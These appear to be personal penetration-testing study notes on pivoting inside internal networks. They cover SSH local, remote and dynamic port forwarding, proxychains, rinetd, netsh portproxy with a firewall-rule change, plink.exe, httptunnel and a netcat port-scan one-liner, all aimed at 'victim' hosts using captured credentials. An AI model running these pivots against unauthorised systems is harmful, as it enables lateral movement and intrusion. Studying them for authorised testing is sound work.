Internal Pentesting:
===================
Basics:
	Internal Port:
		If a machine has 2 network interfaces:
			eth0 => using this, we can connect to machine
			lo => loopback interface
				We cant connect to this interface, so any services running on its ports are internal services running on internal ports.
	Multihomed Devices:
		A device having more than 1 network interface
	proxychains:
		Its used to force any program you wish to use through the dynamic proxy.
		proxychains uses port 9050 by defualt
		Installation:
			apt-get install proxychains
		configuration file:
			/etc/proxychain.conf
		usage:
			proxychains nmap -sC -sV <ip>
			when we use "proxychains" before a command, it forces the application's traffic to pass through the proxy specified in configuration file
	ssh configuration:(/etc/ssh/sshd_config)
		to allow -R  in ssh:
			add "GatewayPorts clientspecified" in /etc/ssh/sshd_config
			systemctl restart ssh
	Pivoting:
		The technique of using one compromised machine to access another is called pivoting.
		In this technique:
			Machine1 is called the pivot
			The pivot is used to route traffic for our attack.
		condition for machine 1:
			it should have atleast 3 network interfaces:
				loopback
				eth0
				eth1(or something else)
	Tunneling:
		Encapsulating a protocol in some other protocol
Finding which devices are multihomed:
	Scenario => we are connected to LAN of a device in some multi-tired architecture
	http://pentestmonkey.net/uncategorized/finding-ip-addresses-of-other-network-interfaces-on-linux
Port Forwarding:
	SSH Tunneling:(Port Forwarding on SSH)
		Basics:
			-N => This flag instructs SSH to not send any remote commands, once more useful for port forwarding.
			-f => This flag asks SSH to background immediately upon connection. Useful for port forwarding so you donâ€™t need to leave a terminal open and also not ruin your forward by accidentally sending any commands.
		Advantages:
			we want to encrypt traffic that uses unencrypted protocols.
			we are on a public network and want to encrypt all our http traffic.
			we want to bypass firewall rules.		
		ssh -L:(Local port forwarding)
			Here, a port is opened on our local machine and traffic sent to that port is forwarded to a port on the remote side
			-L Specifies that the given port on the local host is to be forwarded to the given host and port on the remote side.
			Using ssh -L for 127.0.0.1:
				Usage:
					ssh -p 22 user@192.168.9.21 -L 127.0.0.1:2000:127.0.0.1:2222
						192.168.9.21 => victim
						sets up a local portforward on kali on TCP port 2000 connecting to internal TCP port 2222 of victim
					nc 127.0.0.1 2000 => connects to internal TCP port 2222 of victim
			Using ssh -L for Remote Targets:
				Scenario:
					Attacker:
						192.168.1.2
						has creds for ryan's ssh
						Wishes to see index.php on suzie server
					Ryan:
						He has two network interfaces and on both SSH port is open
							192.168.1.50
							10.1.1.40
					Suzie:
						10.1.1.90
						she is having a web server on port 80
					Attack:
						Attacker>ssh ryan@192.168.1.50 -L 127.0.0.1:1234:10.1.1.90:80
							sets up a local portforward on kali on TCP port 1234 to port 80 of 10.1.1.90
							Now, Attacker can goto 127.0.0.1:1234 to access the webserver
				Setting up multiple port forwards from one ssh connection:
					This is useful when we wanna do some exploit, the below example shows port forward to exploit eternal blue
					ssh -p 22 hero@192.168.55.24 -L 4450:192.168.56.98:445 \ -L 4589:192.168.56.98:135 \ -L 4725:192.168.56.98:49188
						This sets up port forward on kali on TCP port 4450 for 445, 4589 for 135, 4725 for 49188 of 192.168.56.98
		ssh -R:(Remote port forwarding)
			Here, a port is opened on the remote side and traffic sent to that port is forwarded to a port on our local machine
			Using ssh -R for Remote Targets:
				Understanding it:
					ssh -p 22 root@tinyserver -R tinyserver:80:127.0.0.1:80
						kali forwards port 80 to port 80 of tinyserver
					It specifies that a connection made to the port 80 of tinyserver is to be forwarded to port 80 on your local machine. That means if someone connects to the small and slow server with a webbrowser, he gets the response of the webserver running on your local machine. The tinyserver, which has not enough diskspace for the big website, has no webserver running. But people connecting to tinyserver think so.
				Using in pentesting:
					Sometimes, a firewall blocks inbound connections to some ports (means connecting from kali to victim) but allows outbound connections (means connecting from victim to kali) 
			Using ssh -R for 127.0.0.1:
				ssh -p 22 user@192.168.9.21 -R 127.0.0.1:5000:127.0.0.1:5555
					192.168.9.21 => victim
					sets up a local portforward on victim on TCP port 5000 connecting to internal TCP port 5555 of kali
		ssh -D:(Dynamic port forwarding)
			Where as previously both local and remote port forwarding allowed interaction with a single port, dynamic allows a full range of TCP communication across a range of ports
			The -D flag makes SSH acting as a proxy server, so, we can pass any traffic through it as we want.
			Scenario:	
				Attacker:
					192.168.1.2
					Wishes to see index.php on suzie server
					has creds for ryan's ssh
				Ryan:
					He has two network interfaces and on both SSH port is open
						192.168.1.50
						10.1.1.40
				Suzie:
					10.1.1.90
					she is having rdp open and ssh open on port 2222
			Attack:	
				ssh -f -N -D 9050 ryan@192.168.1.50
				proxychains ssh -p 2222 suzie@10.1.1.90
				proxychains rdesktop 10.1.1.90 -u Administrator -p password -g 90%
	Rinetd:
		Installation:
			apt-get install rinetd
		Usage:
			Edit /etc/rinetd.conf:
				bind_ip bind_port connect_ip connect_port
					bind => incoming(victim)
					connect => outgoing(attacker)
			service restart rinetd
			Example:
				0.0.0.0 80 192.34.56.78 80
				http://127.0.0.1 => redirects to http://192.34.56.78
	netsh:(Windows Redirector)
		Its installed by deault in windows
		It is used in windows, it means that the windows client forwards its internal ports to some port of kali (attacker)
		cmd> netsh interface portproxy add v4tov4 listenport=kali_port listenaddress=kali_ip connectport=windows_port connectaddress=windows_ip 
		cmd> netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=kali_ip localport=kali_port action=allow
	plink.exe:(cli interface for puTTY)
		It is used in windows, it means that the windows client forwards its internal ports to some port of kali (attacker)
		Remote port forward:
			plink.exe -ssh -l root -pw toor -R 10.10.11.4:1234:127.0.0.1:3306 10.10.11.4
				plink.exe -ssh -l root -pw toor -R listenip:listen-port:host:port-to-forward listenip
				windows victim forwards port 3306 to port 1234 of kali
		Local port forward:
			plink.exe -ssh -l root -pw toor -R listenip:listen-port:host:port-to-forward 
		Dynamic port forward:
			plink.exe -ssh -l root -pw toor -R listenip:listen-port
		Note:
			Always append the plink.exe commands like this: 
				cmd> cmd.exe /c echo y | plink.exe --------
				Provides interactivity => means provide kali shell inside cmd shell
		flags:
			listener => attacker
			host => victim
			-ssh => connect via ssh
			-l => username
			-pw => password
	httptunnel:
		Advantages:
			It maybe possible that ssh is not allowed in a system, but http is allowed
		Installation:
			apt-get install httptunnel
		Usage:
			it uses a client/server model
			Server> hts --forward-port localhost:8888 1234 => listens on 1234 and redirects to 8888
			Client> htc --forward-port 8080 ip_of_server:1234 => listens on 8080 and forward it to server port 1234
Internal Port Scanning:
	it may be possible that our vicitm doesnt have "nmap" installed.
	using nc + bash:
		top10=(20 21 22 23 25 80 110 139 443 445 3389); for i in "${top10[@]}"; do nc -w 1 192.168.30.253 $i && echo "Port $i is open" || echo "Port $i is closed or filtered"; done